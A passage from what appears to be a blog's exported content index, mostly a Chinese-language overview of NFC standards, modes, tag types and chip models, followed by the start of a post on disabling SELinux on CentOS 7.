10536</code>，该标准主要发展于1992到1995年间，由于这种卡的成本高，优点少，因此从未在市场上销售。</p>\n</li>\n</ul>\n</li>\n<li><p>中间一条技术路线为移动终端，它演化出了携带NFC功能的终端设备。随着移动终端越来越智能，NFC和这些设备也融合得更加紧密，使得NFC的应用场景得到了较大的拓展。</p>\n</li>\n</ol>\n<p>从协议栈的角度，下图是 NFC 各类标签所涉及的技术标准。</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/protocol-2.png\" class=\"\">\n\n<p>此外，还有几个与NFC密切相关的技术标准：</p>\n<h3 id=\"ISO-IEC-7816\"><a href=\"#ISO-IEC-7816\" class=\"headerlink\" title=\"ISO/IEC 7816\"></a><code>ISO/IEC 7816</code></h3><p>一套成熟的接触式智能卡标准，用于读写接触式智能卡，例如PSAM、SAM、手机的SIM卡等皆符合该协议标准，其采用半双工串行通信接口，由VCC, RESET, CLK, IO, VPP（保留接口，不使用）组成。</p>\n<p>其中有一部分定义了与应用相关的规范，NFC Forum也参照该标准实现了类似功能。其全部内容包括：</p>\n<ul>\n<li>ISO7816-1：接触式卡智能卡的物理特性</li>\n<li>ISO7816-2：接触式卡智能卡触点的尺寸与位置</li>\n<li>ISO7816-3：接触式卡智能卡的电信号和传输协议</li>\n<li>ISO7816-4：接触式卡智能卡与外界交互的介面</li>\n<li>ISO7816-5：接触式卡智能卡应用的命名方式与注册系统</li>\n<li>ISO7816-6：接触式卡智能卡与外界交互的资料物件</li>\n<li>ISO7816-7：接触式卡智能卡的结构化查询语句</li>\n<li>ISO7816-8：接触式卡智能卡与安全有关的指令</li>\n<li>ISO7816-9：接触式卡智能卡附加指令与安全参数</li>\n</ul>\n<h3 id=\"S2C接口-ISO-IEC-28361\"><a href=\"#S2C接口-ISO-IEC-28361\" class=\"headerlink\" title=\"S2C接口 &#x3D;  ISO/IEC 28361\"></a><code>S2C接口</code> &#x3D;  <code>ISO/IEC 28361</code></h3><p>由飞利浦公司最早提出，用于在手机上实现 NFC 功能，定义了NFC芯片和智能卡芯片的接口方式，并成为ISO 和 ECMA的共同标准。<br>此后，由于遭到主流运营商的反对，最终飞利浦公司放弃了该技术标准，转而与GEMALTO公司合作支持<code>SWP协议</code>。</p>\n<h3 id=\"SWP协议-ETSI-TS-102613\"><a href=\"#SWP协议-ETSI-TS-102613\" class=\"headerlink\" title=\"SWP协议 &#x3D; ETSI TS-102613\"></a><code>SWP协议</code> &#x3D; <code>ETSI TS-102613</code></h3><p>由GEMALTO公司提出，法国公司 Inside开发了支持 SWP 的产品雏形。<br>单线连接协议(Single Wire Protocol)，定义了CLF模块和USIM卡内的SE芯片传输信息的物理连接形式和底层信号传输方式。由于商业利益的考虑，最终SWP的架构获得运营商（GSMA）的一致支持，已经成为事实上的行业标准。</p>\n<p>该标准已经获得<code>ETSI TS-102613</code>，但尚未成为ISO标准。</p>\n<blockquote>\n<p>SWP 也好、S2C 也好，和 NFC 规范是没有直接联系的，更没有冲突。NFC 规范定义的是 NFC 设备与外界的通讯规范，S2C&#x2F;SWP 定义的是 NFC 内部实现的不同方式，是 NFC 芯片和智能卡芯片芯片之间的接口方式和通讯协议。NFC（ISO 18902）和SWP， NFC 论坛和 ETSI 也是没有直接联系，更没有直接冲突，这些是组成完整的 NFC 系统和产业环境必不可少的几个部分。</p>\n</blockquote>\n<h2 id=\"NFC的运行模式\"><a href=\"#NFC的运行模式\" class=\"headerlink\" title=\"NFC的运行模式\"></a>NFC的运行模式</h2><p>从用户角度（即图中的Applications层之上）来看，NFC有三种运行模式（operation mode），分别是</p>\n<ul>\n<li><code>Reader/Write</code>：简称R&#x2F;W，和NFC Tag&#x2F;NFC Reader相关</li>\n<li><code>Card Emulation</code>：简称CE，它能把携带NFC功能的设备模拟成Smart Card，这样就能实现诸如手机支付、门禁卡之类的功能</li>\n<li><code>Peer-to-Peer</code>：简称P2P，它支持两个NFC设备交互</li>\n</ul>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/nfc-mode.png\" class=\"\">\n\n<h3 id=\"读卡器模式（Reader-Write-Mode）\"><a href=\"#读卡器模式（Reader-Write-Mode）\" class=\"headerlink\" title=\"读卡器模式（Reader&#x2F;Write Mode）\"></a>读卡器模式（Reader&#x2F;Write Mode）</h3><p>在读写器模式中，NFC读卡器询问标签以执行交互。NFC Forum定义了5种类型的标签，涵盖了广泛的应用。读卡器可以是专用的NFC读写器，也可以是移动设备。NFC读写器能够感测多个标签的存在。</p>\n<p>数据在NFC Tag的芯片中，可以简单理解成<strong>刷标签</strong>，本质上就是通过支持NFC的手机或其它电子设备从带有NFC芯片的标签、贴纸、名片等媒介中读写信息，随后它可能根据读取来自部件的信息执行操作。例如，靠近 NFC 标签的 NFC 手机会检索到一个 URL，并链接到相应的网站，NFC手机可以在无需打字的情况下发送 SMS （短消息服务）文本、获得优惠券、启动配对动作、获得电子名片（Vcard）等。</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/rw-mode.jpg\" class=\"\">\n\n<p>对于读卡器模式，NFC Forum定义了4种标准类型的 NFC 标签（Type 5还不是正式标准），这四种类型NFC Tag的区别在于存储空间大小，数据传输率以及底层使用的协议上，后面有具体的技术细节。</p>\n<p>此外，NFC Forum定义了两个通用的数据结构用于在NFC Device之间（包括R&#x2F;W模式中的NFC Reader和NFC Tag）传递数据。这两个通用数据结构分别是NFC Data Exchange Format（简写为NDEF）以及NFC Record。</p>\n<blockquote>\n<p>对于“刷标签”场景，NFC 手机工作在主动模式，而NFC标签是不需要外部供电的，依靠NFC手机发送的电磁场获得能量，<strong>此时数据传输是不安全的</strong>。</p>\n</blockquote>\n<h3 id=\"卡模拟模式（Card-Emulation-Mode）\"><a href=\"#卡模拟模式（Card-Emulation-Mode）\" class=\"headerlink\" title=\"卡模拟模式（Card Emulation Mode）\"></a>卡模拟模式（Card Emulation Mode）</h3><p>数据在支持NFC的手机中，可以简单理解成<strong>刷手机</strong>。本质上就是将支持NFC的手机或其它电子设备当成借记卡、公交卡、门禁卡等IC卡使用。</p>\n<p>基本原理是将相应IC卡中的信息凭证封装成数据包存储在支持NFC的外设中，在使用时还需要一个NFC射频器（例如Pos终端、闸机等），将手机靠近NFC射频器，手机就会接收到NFC射频器发过来的信号，在通过一系列复杂的验证后，将IC卡的相应信息传入NFC射频器，最后这些IC卡数据会传入NFC射频器连接的电脑，并进行相应的处理（如电子转帐、开门等操作），这让它可以用于已有的非接触式智能卡基础设施，实现访问控制、非接触式支付、固件更换或数据传输等操作。</p>\n<p>通常存在于移动设备中的NFC控制器模拟ISO &#x2F; IEC 14443或FeliCa标准定义的非接触式卡的行为，用于诸如支付、交通等非接触式基础设施中。<br>在此模式下，NFC控制器仅处理低级别通信，而NFC安全应用程序位于SIM卡、嵌入式安全元件（eSE）、嵌入式SIM卡（eSIM）中或直接位于主应用程序处理器（Android的HCE）中。</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/ce-mode.jpg\" class=\"\">\n\n<p>该模式下，NFC 手机的工作类似于标准的非接触式IC卡，为此ISO 14443定义了Type A 和 Type B两种数据传输标准（Type F不是正式标准），后续有详细技术分析。</p>\n<blockquote>\n<p>对于“刷手机”场景，NFC 手机工作在被动模式，它只在机具发出的射频场中被动响应，<strong>数据传输是安全的</strong>。</p>\n</blockquote>\n<h3 id=\"点对点模式（Peer-to-Peer-Mode）\"><a href=\"#点对点模式（Peer-to-Peer-Mode）\" class=\"headerlink\" title=\"点对点模式（Peer-to-Peer Mode）\"></a>点对点模式（Peer-to-Peer Mode）</h3><p>此模式设计用于交换两个NFC设备（如移动电话）之间的联系人信息等数据。每个点轮流作为读卡器（收发器）和标签，以实现双方之间的完整交换。</p>\n<p>在点对点 （P2P）中，具有 NFC 功能的设备工作在主动模式。其中的一个设备会发起通信链接。一旦链接建立，设备就会交替地与其他设备通信，并遵守 “说前先听(listen-before-talk)” 规则。该通信模式下的数据交换相比其他模式更快，因此可以交换更多的数据。</p>\n<h3 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h3><p>从协议栈的角度，三种工作模式的分析如下：</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/rf.jpg\" class=\"\">\n\n<h2 id=\"NFC的数据传输协议\"><a href=\"#NFC的数据传输协议\" class=\"headerlink\" title=\"NFC的数据传输协议\"></a>NFC的数据传输协议</h2><p>NFC Forum定义了5种数据传输方式，其中：</p>\n<ul>\n<li>NFC-A：对应<code>ISO 14443 Type A</code></li>\n<li>NFC-B：对应<code>ISO 14443 Type B</code></li>\n<li>NFC-F：对应非ISO标准的<code>FeliCa</code>，也称为Type-F</li>\n<li>NFC-V：对应<code>ISO 15693</code></li>\n<li>P2P：基于<code>ISO 18092</code>，主要用于Android Beam，实现两台 Android 设备之间进行简单的点对点数据交换</li>\n</ul>\n<p><code>ISO 14443</code>全称为非接触式IC卡标准，它从RF层面定义了如何与不同的非接触式IC卡（其实物可以是NFC Tag、RFID Tag、Smart Cards）交互。</p>\n<p>该标准包含四个部分：</p>\n<ul>\n<li>ISO&#x2F;IEC14443-1:   制定了有关非接触卡的物理特性；</li>\n<li>ISO&#x2F;IEC14443-2:   制定了有关射频功率及信号界面的特性；</li>\n<li>ISO&#x2F;IEC14443-3:   则为非接触卡的初始化及防冲突机制；</li>\n<li>ISO&#x2F;IEC14443-4:   位有关的交易协定。</li>\n</ul>\n<p>ISO 14443定义了Type A和Type B两种非接触式IC卡。不同TYPE的主要的区别在于信号发送的载波调制深度、二进制数编码方式存在差异。此外，防冲突机制的原理也完全不同，TYPE A是基于 BIT 冲突检测协议，TYPE B则是通过字节、帧及命令完成防冲突。</p>\n<h3 id=\"NFC-A-ISO-IEC-14443-3-Type-A\"><a href=\"#NFC-A-ISO-IEC-14443-3-Type-A\" class=\"headerlink\" title=\"NFC-A &#x3D; ISO&#x2F;IEC 14443-3 Type A\"></a>NFC-A &#x3D; ISO&#x2F;IEC 14443-3 Type A</h3><p>最早由Philips公司制订（其生产的芯片商标名为MIFARE，现在由从Philips独立出来的NXP公司拥有），目前世界上70%左右的非接触式IC卡都使用了MIFARE芯片，例如北京市的公交卡，特点是采用Modified Miller编码。</p>\n<blockquote>\n<p>Android 4.4 支持基于NFC-Forum ISO-DEP规范（基于ISO&#x2F;IEC 14443-4）的模拟卡，要求仅使用 Nfc-A (ISO&#x2F;IEC 14443-3 Type A) 技术模拟 ISO-DEP，但也可以支持 Nfc-B (ISO&#x2F;IEC 14443-4 Type B) 技术。</p>\n</blockquote>\n<h3 id=\"NFC-B-ISO-IEC-14443-4-Type-B\"><a href=\"#NFC-B-ISO-IEC-14443-4-Type-B\" class=\"headerlink\" title=\"NFC-B &#x3D; ISO&#x2F;IEC 14443-4 Type B\"></a>NFC-B &#x3D; ISO&#x2F;IEC 14443-4 Type B</h3><p>由TI公司制订，主要用在法国市场，特点是采用NRZ编码，二者最终都成为ISO标准。</p>\n<blockquote>\n<p>第二代居民身份证采用的是Type B标准。</p>\n</blockquote>\n<h3 id=\"NFC-F-FeliCa-JIS-X6319-4\"><a href=\"#NFC-F-FeliCa-JIS-X6319-4\" class=\"headerlink\" title=\"NFC-F &#x3D; FeliCa &#x3D; JIS X6319-4\"></a>NFC-F &#x3D; FeliCa &#x3D; JIS X6319-4</h3><p>FeliCa是Sony为了非接触式IC卡而开发出来的通信技术，与ISO 14443标准的主要区别是采用曼彻斯特编码。<br>1998年，FeliCa原本被提案为ISO 14443 type C，但悲剧的是未被采纳，只能成为日本工业标准<code>JIS X6319-4</code>。之后，FeliCa和其向后相容方式被标准化为<code>ISO 18092</code>。</p>\n<blockquote>\n<p>目前，Felica也被称为Type F，主要应用于日本市场，境外只有香港的“八达通”仍有继续使用。</p>\n</blockquote>\n<h3 id=\"NFC-V-ISO-IEC-15693-2\"><a href=\"#NFC-V-ISO-IEC-15693-2\" class=\"headerlink\" title=\"NFC-V &#x3D; ISO&#x2F;IEC 15693-2\"></a>NFC-V &#x3D; ISO&#x2F;IEC 15693-2</h3><p><code>ISO/IEC 15693</code> 标准最初是为访问控制而设计的，符合此标准的标签的读取范围高达 3 英尺（0.9 米）,主要用于公共图书馆 RFID 系统和带 RFID 卡或 RFID 票证的滑雪通行证 RFID 系统.<br>对比，<code>ISO/IEC 14443 Type A</code> 标签，由于其主要为银行RFID卡、交通RFID卡等金融交易而设计，为防止有人截获从标签发送到读取器的数据，读取距离设计为非常短，安全性要求更高。</p>\n<h2 id=\"NFC的标签类型\"><a href=\"#NFC的标签类型\" class=\"headerlink\" title=\"NFC的标签类型\"></a>NFC的标签类型</h2><p>NFC 论坛定义了四种类型的 NFC 标签，第五种标签与 NFC-V 技术相关，目前它还不是NFC 论坛规范中的一部分。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">项目</th>\n<th align=\"center\">Type 1</th>\n<th align=\"center\">Type 2</th>\n<th align=\"center\">Type 3</th>\n<th align=\"center\">Type 4</th>\n<th align=\"center\">Type 5</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">对应规范</td>\n<td align=\"center\">ISO 14443 Type A</td>\n<td align=\"center\">ISO 14443 Type A</td>\n<td align=\"center\">JIS X 6319-4、FELICA</td>\n<td align=\"center\">ISO 14443 Type A&#x2F;B</td>\n<td align=\"center\">ISO&#x2F;IEC 15693</td>\n</tr>\n<tr>\n<td align=\"center\">常见芯片</td>\n<td align=\"center\">Topaz</td>\n<td align=\"center\">MIFARE</td>\n<td align=\"center\">Felica</td>\n<td align=\"center\">MIFARE-DESFire</td>\n<td align=\"center\">NXP的I Code系列，ST的ST25TV系列</td>\n</tr>\n<tr>\n<td align=\"center\">存储容量</td>\n<td align=\"center\">最大1KB</td>\n<td align=\"center\">最大2KB</td>\n<td align=\"center\">最大1MB</td>\n<td align=\"center\">最大64KB</td>\n<td align=\"center\">高达 8 KB</td>\n</tr>\n<tr>\n<td align=\"center\">读写速率</td>\n<td align=\"center\">106kbps</td>\n<td align=\"center\">106kbps</td>\n<td align=\"center\">212kbps</td>\n<td align=\"center\">106-424kbps</td>\n<td align=\"center\">26.48 kbps</td>\n</tr>\n<tr>\n<td align=\"center\">价格</td>\n<td align=\"center\">低</td>\n<td align=\"center\">低</td>\n<td align=\"center\">高</td>\n<td align=\"center\">中等&#x2F;高</td>\n<td align=\"center\">低</td>\n</tr>\n<tr>\n<td align=\"center\">安全性</td>\n<td align=\"center\">数字签名保护</td>\n<td align=\"center\">不安全</td>\n<td align=\"center\">数字签名保护</td>\n<td align=\"center\">可选</td>\n<td align=\"center\">N&#x2F;A</td>\n</tr>\n<tr>\n<td align=\"center\">说明</td>\n<td align=\"center\">Topaz由Innovision公司推出</td>\n<td align=\"center\">MIFARE由NXP公司推出</td>\n<td align=\"center\">由Sony公司推出，价格比较贵</td>\n<td align=\"center\">这类芯片在出厂时就被配置好是否只读或可读写</td>\n<td align=\"center\">上海贝岭等</td>\n</tr>\n</tbody></table>\n<h2 id=\"NFC的数据交换格式\"><a href=\"#NFC的数据交换格式\" class=\"headerlink\" title=\"NFC的数据交换格式\"></a>NFC的数据交换格式</h2><p>NFC Forum定义了两个通用的数据结构用于在NFC Device之间（包括R&#x2F;W模式中的NFC Reader和NFC Tag）传递数据。这两个通用数据结构分别是NFC Data Exchange Format（简写为<code>NDEF</code>）以及NFC Record。</p>\n<p>NFC设备中的数据根据结构化格式整理为记录，称为NFC数据交换格式（NDEF）。记录包含根据记录类型定义（RTD）规范所编码的信息：</p>\n<ul>\n<li>“设备信息”，例如固件版本</li>\n<li>“文本”字符串</li>\n<li>“通用资源标识符”，例如网页URL</li>\n<li>“连接切换”，用于配对</li>\n<li>“签名”，用于验证</li>\n<li>“智能标贴”，类似于SMS消息的文本</li>\n</ul>\n<p>NDEF还定义了如何将记录封装到消息中，以便将它们传输到其他设备。所有符合NFC标准的设备都支持NDEF，无论其类型如何。<br>对于移动设备，NDEF消息由内置软件处理，它将触发设备本身的相应操作，如：</p>\n<ul>\n<li>发送电子邮件或SMS</li>\n<li>打开网页</li>\n<li>拨打电话</li>\n<li>打开特定应用程序</li>\n</ul>\n<p>NFC Forum定义和维护了完整的操作列表和RTD。</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/nedf.png\" class=\"\">\n\n<p>在点对点模式下，交换的数据愈发复杂，数量更庞大。数据交换根据简单NDEF交换协议（SNEP）完成，以确保高效、稳健和快速的交互。<br>SNEP使用可靠的传输层：逻辑链路控制协议（LLCP）。</p>\n<h2 id=\"NFC标准的最新进展\"><a href=\"#NFC标准的最新进展\" class=\"headerlink\" title=\"NFC标准的最新进展\"></a>NFC标准的最新进展</h2><h3 id=\"NFCIP-1-ISO-IEC-18092-ECMA-340\"><a href=\"#NFCIP-1-ISO-IEC-18092-ECMA-340\" class=\"headerlink\" title=\"NFCIP-1 &#x3D; ISO&#x2F;IEC 18092 &#x3D; ECMA 340\"></a>NFCIP-1 &#x3D; ISO&#x2F;IEC 18092 &#x3D; ECMA 340</h3><p><code>ECMA 340</code>是基础版本，被ISO接纳成为<code>ISO/IEC 18092</code>，同时在NFC Forum中被称为<code>NFCIP-1</code>，这三者就是一回事。</p>\n<p><code>ISO/IEC 18092</code>（NFCIP-1 近场通信 - 接口和协议规范）的基本内容包括：</p>\n<ul>\n<li>在RF层面，直接继承自<code>ISO 14443 Type A</code>，并且还继承自日本<code>JIS 6319-4</code>（Sony FeliCa也基于该标准）由NFC论坛3型标签标准使用）,结果是NFC设备（读取器&#x2F;写入器模式）与ISO 14443智能卡兼容。</li>\n<li>在应用层面，为实现P2P通讯，定义了<code>Active（主动）</code>和<code>Passive（被动）</code>等两种通信模式，并使用不同的命令协议来代替 <code>ISO/IEC 14443-4</code></li>\n<li>进一步的，定义了R&#x2F;W、CE、P2P等三种操作模式，从而实现NFC 设备以点对点模式与其他 NFC 设备和 NFC 标签（卡）的互操作</li>\n</ul>\n<blockquote>\n<p>NFC论坛指出，在卡模拟模式下，支持NFC的手机可以支持<code>EMV CCPS</code> v2.0规定的非接触式卡EMV支付应用要求，具体体现在American Express ExpressPay 2.0、MasterCard PayPass 2.0和Visa payWave 2.1.1。</p>\n</blockquote>\n<h3 id=\"NFCIP-2-ISO-IEC-21481-ECMA-352\"><a href=\"#NFCIP-2-ISO-IEC-21481-ECMA-352\" class=\"headerlink\" title=\"NFCIP-2 &#x3D; ISO&#x2F;IEC 21481 &#x3D; ECMA 352\"></a>NFCIP-2 &#x3D; ISO&#x2F;IEC 21481 &#x3D; ECMA 352</h3><p><code>ECMA 352</code>是<code>ISO 21481</code>的前身，定义了在相同频率13.56Mhz上运行的不同非接触技术之间的选择机制。<br>最重要的变化是，在支持根据<code>ISO/IEC 18092</code>的基础上，兼容支持<code>ISO 15693</code>。</p>\n<h3 id=\"后续演进\"><a href=\"#后续演进\" class=\"headerlink\" title=\"后续演进\"></a>后续演进</h3><p>NFC技术的发展方兴未艾，当前还在快速变化中，最新进展包含了几个正在积极申请的新标准。</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/nfc-protocol-3.bmp\" class=\"\">\n\n<p>立此存照，未来可期！！！</p>\n<hr>\n<h2 id=\"附录一：NFC的核心技术标准清单\"><a href=\"#附录一：NFC的核心技术标准清单\" class=\"headerlink\" title=\"附录一：NFC的核心技术标准清单\"></a>附录一：NFC的核心技术标准清单</h2><img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/protocol-3.png\" class=\"\">\n\n<h2 id=\"附录二：NFC主流芯片型号\"><a href=\"#附录二：NFC主流芯片型号\" class=\"headerlink\" title=\"附录二：NFC主流芯片型号\"></a>附录二：NFC主流芯片型号</h2><h3 id=\"ISO-14443-Type-A\"><a href=\"#ISO-14443-Type-A\" class=\"headerlink\" title=\"ISO 14443 Type A\"></a>ISO 14443 Type A</h3><ul>\n<li>MF1 IC S20：国内常称为MIFARE Mini，原装芯片厂家为荷兰恩智浦(NXP)，在一卡通方面应用普遍。</li>\n<li>SLE66R35：德国英飞凌（infineon），兼容MF1 IC S50。</li>\n<li>FM11RF08：芯片厂家为上海复旦，兼容MF1 IC S50。</li>\n<li>Mifare Std 1k MF1 IC S50及其兼容卡：原装芯片厂家为荷兰恩智浦(NXP)，在一卡通方面应用普遍。</li>\n<li>Mifare Std 4k MF1 IC S70及其兼容卡：原装芯片厂家为荷兰恩智浦(NXP)，在一卡通方面应用普遍。</li>\n<li>Mifare Ultralight MF0 IC U1X：国内常称为U10,芯片厂家为荷兰恩智浦(NXP)，广深高速火车票为典型应用。</li>\n<li>Mifare Ultralight C：原装芯片厂家为荷兰恩智浦（NXP）。</li>\n<li>FM11RF005:芯片厂家为上海复旦,包括FM11RF005SH与FM11RF005M,上海地铁单程票、上海轮渡单程票为典型应用。</li>\n<li>FM11RF08:芯片厂家为上海复旦</li>\n<li>Mifare DESfire 2k MF3 IC D21：芯片厂家为荷兰恩智浦（NXP），国内常称为MF3 2k。</li>\n<li>Mifare DESfire 4k MF3 IC D41：芯片厂家为荷兰恩智浦（NXP），国内常称为MF3。南京地铁卡为典型应用。</li>\n<li>Mifare DESfire 8k MF3 IC D81：芯片厂家为荷兰恩智浦（NXP），国内常称为MF3 8k。</li>\n<li>Mifare ProX：芯片厂家为荷兰恩智浦（NXP）。不判别容量</li>\n<li>SHC1102：芯片厂家为上海华虹，上海一卡通为典型应用。</li>\n<li>Advant ATC2048-MP：芯片厂家为瑞士LEGIC。</li>\n<li>MF1 PLUS 2k：芯片厂家为荷兰恩智浦（NXP），国内常称为PLUS S。</li>\n<li>MF1 PLUS 4k：芯片厂家为荷兰恩智浦（NXP），国内常称为PLUS X。</li>\n<li>JEWEL：芯片厂家为英国innovision，国内常称为宝石卡。不读序列号。</li>\n<li>IS23SC4456：芯片厂家为美国ISSI，可兼容MF1 IC S50的CPU卡。</li>\n<li>CPU卡（兼容MF1）：芯片厂家为上海复旦、上海华虹等，可兼容MF1 IC S50的CPU卡。该类也包含FM1208M1及其它类似的芯片卡。</li>\n<li>纯CPU卡：芯片厂家为上海复旦、美国ISSI等，纯CPU卡。该类也包含FM1208、IS23SC4456中的纯CPU卡及其它类似的芯片卡。</li>\n<li>X82A：芯片厂家为北京华大，CPU卡。</li>\n</ul>\n<h3 id=\"ISO-14443-Type-B\"><a href=\"#ISO-14443-Type-B\" class=\"headerlink\" title=\"ISO 14443 Type B\"></a>ISO 14443 Type B</h3><ul>\n<li>AT88RF020：芯片厂家为美国爱特梅尔（ATMEL），广州地铁卡为典型应用。</li>\n<li>SR176：芯片厂家为瑞士意法半导体（ST），主要用于防伪识别等。</li>\n<li>SRIX4K：芯片厂家为瑞士意法半导体（ST），主要用于防伪识别等。</li>\n<li>SRT512：芯片厂家为瑞士意法半导体（ST），主要用于防伪识别等。</li>\n<li>ST23YR18：芯片厂家为瑞士意法半导体（ST），CPU卡。</li>\n<li>THR1064：芯片厂家为北京同方，奥运门票为典型应用。</li>\n<li>THR2408：芯片厂家为北京同方，纯CPU卡。</li>\n<li>第二代居民身份证：芯片厂家为上海华虹、北京同方THR9904、天津大唐和北京华大，第二代身份证为典型应用。</li>\n</ul>\n<h3 id=\"ISO-15693\"><a href=\"#ISO-15693\" class=\"headerlink\" title=\"ISO 15693\"></a>ISO 15693</h3><ul>\n<li>EM4135：芯片厂家为瑞士EM，主要用于票证管理、防伪识别等。</li>\n<li>ICODE SL2 ICS53&#x2F;ICODE SL2 ICS54：芯片厂家为荷兰恩智浦（NXP），国内常称为ICODE SLI-S，主要用于物流仓储、票证管理等。</li>\n<li>ICODE SL2 ICS20：芯片厂家为荷兰恩智浦（NXP），国内常称为I CODE 2，主要用于物流仓储、票证管理等。</li>\n<li>ICODE SL2 ICS50&#x2F;ICODE SL2 ICS51：芯片厂家为荷兰恩智浦（NXP），国内常称为ICODE SLI-L，主要用于物流仓储、票证管理等。</li>\n<li>Tag-it HF-1 Plus：芯片厂家为美国德州仪器（TI），国内常称为TI2048，主要用于物流仓储、票证管理等。</li>\n<li>Tag-it HF-1 Standard：芯片厂家为美国德州仪器（TI），国内常称为TI256，主要用于物流仓储、票证管理等。</li>\n<li>BL75R04：芯片厂家为上海贝岭，兼容TI 2048，主要用于物流仓储、票证管理等。</li>\n<li>BL75R05：芯片厂家为上海贝岭，兼容I CODE 2，主要用于物流仓储、票证管理等。</li>\n<li>FM1302N：芯片厂家为上海复旦，兼容I CODE 2，主要用于物流仓储、票证管理等。</li>\n<li>Advant ATC128-MV：芯片厂家为瑞士LEGIC，主要用于一卡通等。</li>\n<li>Advant ATC256-MV：芯片厂家为瑞士LEGIC，主要用于一卡通等。</li>\n<li>Advant ATC1024-MV：芯片厂家为瑞士LEGIC，主要用于一卡通等。</li>\n<li>LRI2K：芯片厂家为瑞士意法半导体（ST）。</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://static.kancloud.cn/alex_wsc/android-wifi-nfc-gps\">深入理解Android：Wi-Fi、NFC和GPS卷</a></li>\n<li><a href=\"https://nfc-forum.org/our-work/specification-releases/\">NFC-Forum官方网站的技术文档列表</a></li>\n<li><a href=\"https://nfc-forum.org/products/certified-products\">获得NFC-Forum官方认证的芯片清单</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/EMV\">EMV组织的Wiki信息</a></li>\n<li><a href=\"https://lishiwen4.github.io/nfc/nfc-introduce\">NFC标准概述</a></li>\n<li><a href=\"https://www.st.com/resource/zh/brochure/nfc_solutions_from_st.pdf\">ST意法半导体公司的NFC产品说明书</a></li>\n</ul>\n<h2 id=\"资料下载\"><a href=\"#资料下载\" class=\"headerlink\" title=\"资料下载\"></a>资料下载</h2><ul>\n<li><a href=\"ISO14443-Overview-v5.ppt\">ISO14443 Overview-v5</a></li>\n<li><a href=\"tn1216-st25-nfc-guide-stmicroelectronics.pdf\">NFC技术指南</a></li>\n<li><a href=\"Near_Field_Communication_with_Linux.pdf\">NFC在Linux的技术实现</a></li>\n<li><a href=\"NFC_mcs.pdf\">NFC技术综述-中华电信</a></li>\n</ul>\n"},{"title":"关于Selinux的疑难杂症","url":"/2020/09/01/%E5%85%B3%E4%BA%8ESelinux%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/","content":"<p>版本的，每次使用都会遇到一些那些不知道的问题。记录下来过程，学习中遇到的一些坑。</p>\n<ul>\n<li>系统版本：CentOS Linux release 7.3.1611 (Core)</li>\n<li>系统内核：3.10.0-514.el7.x86_64</li>\n</ul>\n<p>#获取selinux状态信息<br>[root@17-Cobbler ~]# getenforce<br>Enforcing<br>#临时关闭selinux，跟原来的版本一样的<br>[root@17-Cobbler ~]# setenforce 0<br>[root@17-Cobbler ~]# getenforce<br>Permissive</p>\n<p>#问题就是在修改配置文件<br>#按照CentOS 6修改配置文件的位置:&#x2F;etc&#x2F;sysconfig&#x2F;selinux<br>[root@17-Cobbler ~]# sed -i “s#SELINUX&#x3D;enforcing#SELINUX&#x3D;disabled#g” &#x2F;etc&#x2F;sysconfig&#x2F;selinux</p>\n<p>#一直以为这样就是可以了，没有检查。直到搭建服务Cobbler、zabbix老是出错问题，查日志才发现原来selinux没有<br>关闭，懵逼了。修改&#x2F;etc&#x2F;sysconfig&#x2F;selinux没有生效，然后百度查询发现有这样一个命令sestatus。</p>\n<p>[root@17-Cobbler conf.d]# sestatus<br>SELinux status:                 enabled<br>SELinuxfs mount:                &#x2F;sys&#x2F;fs&#x2F;selinux<br>SELinux root directory:         &#x2F;etc&#x2F;selinux<br>Loaded policy name:             targeted<br>Current mode:                   permissive<br>Mode from config file:          enforcing<br>Policy MLS status:              enabled<br>Policy deny_unknown status:     allowed<br>Max kernel policy version:      28</p>\n<p>#测试将原来的修改&#x2F;etc&#x2F;sysconfig&#x2F;selinux，selinux状态改成enforcing<br>#然后将&#x2F;etc&#x2F;selinux&#x2F;config，selinux状态修改成disabled<br>[root@17-Cobbler ~]# sed -i “s#SELINUX&#x3D;enforcing#SELINUX&#x3D;disabled#g” &#x2F;etc&#x2F;selinux&#x2F;config<br>#重启<br>[root@17-Cobbler ~]# reboot<br>#再次获取状态，已经关闭了<br>[root@17-Cobbler ~]# getenforce<br>Disabled<br>#确认已经关闭了<br>[root@17-Cobbler ~]# sestatus<br>SELinux status:                 